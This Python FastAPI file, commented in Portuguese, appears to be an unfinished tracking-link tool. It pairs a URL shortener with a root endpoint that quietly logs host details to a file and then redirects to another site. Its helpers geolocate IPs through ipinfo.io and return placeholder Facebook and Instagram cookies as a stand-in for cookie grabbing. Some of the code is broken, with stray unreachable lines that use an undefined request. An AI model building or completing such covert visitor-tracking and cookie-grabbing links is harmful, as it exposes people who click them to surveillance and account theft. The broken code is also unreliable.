import socket
import datetime
import os
import platform
import json
import requests
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import RedirectResponse
import pyshorteners
from pydantic import BaseModel
from utils.parser import Silhouette
from utils.handler import File


app = FastAPI()
class URLItem(BaseModel):
    url: str

# Função para obter o endereço IP

# Função para obter a localização usando a API do ipinfo.io
def get_location(ip, token):
    url = f"https://ipinfo.io/{ip}/json?token={token}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        location = {
            "city": data.get("city", "Unknown"),
            "region": data.get("region", "Unknown"),
            "country": data.get("country", "Unknown"),
            "loc": data.get("loc", "Unknown")
        }
    else:
        location = {
            "city": "Unknown",
            "region": "Unknown",
            "country": "Unknown",
            "loc": "Unknown"
        }
    return location


    user_agent = request.headers.get('user-agent')
    ip = request.client.host

# Função para obter cookies (simulação)
def get_cookies():
    cookies = {
        "facebook": "sample_facebook_cookie",
        "instagram": "sample_instagram_cookie"
    }
    return cookies

# Função para obter informações sobre o sistema
def get_system_info():
    system_info = {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "platform_version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor()
    }
    return system_info

# Função para obter informações sobre a data e hora
def get_datetime():
    now = datetime.datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

# Função para obter o user agent (simulação)
#def get_user_agent():
 #  // return user_agent


# Salvando as informações em um arquivo txt
def save_info(info, filename="info.txt"):
    with open(filename, "w") as file:
        file.write(json.dumps(info, indent=4))

@app.post("/encurtar")
def encurtar_url(item: URLItem):
    s = pyshorteners.Shortener()
    try:
        short_url = s.tinyurl.short(item.url)
        return {"original_url": item.url, "short_url": short_url}
    except Exception as e:
        raise HTTPException(status_code=400, detail="Erro ao encurtar a URL")

@app.get("/")
def read_root():
    file = File()
    figure = Silhouette()
    figure.set_motherfuckin_host_info(socket)

    file.save_info(figure.define_figure(), 'info.txt')
   #
   #
    # Substitua 'YOUR_TOKEN_HERE' pela sua chave de API do ipinfo.io

    print("Informações coletadas e salvas em info.txt")
    return RedirectResponse(url="https://www.outro-site.com")



if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)


